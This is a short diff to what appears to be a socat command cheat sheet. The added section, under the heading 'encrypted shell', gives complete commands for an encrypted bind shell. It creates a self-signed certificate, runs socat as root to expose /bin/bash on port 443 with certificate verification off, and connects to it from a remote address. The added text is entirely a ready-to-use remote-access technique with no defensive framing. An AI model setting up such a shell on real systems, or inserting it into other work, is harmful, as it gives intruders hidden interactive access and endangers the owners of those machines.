@@ -216,6 +216,12 @@ socat TCP-LISTEN:8088,fork TCP:127.0.0.1:80
 
 # minimal forward proxy
 socat TCP-LISTEN:8443,fork TCP:corethreat.net:443
+
+# encrypted shell
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 
 
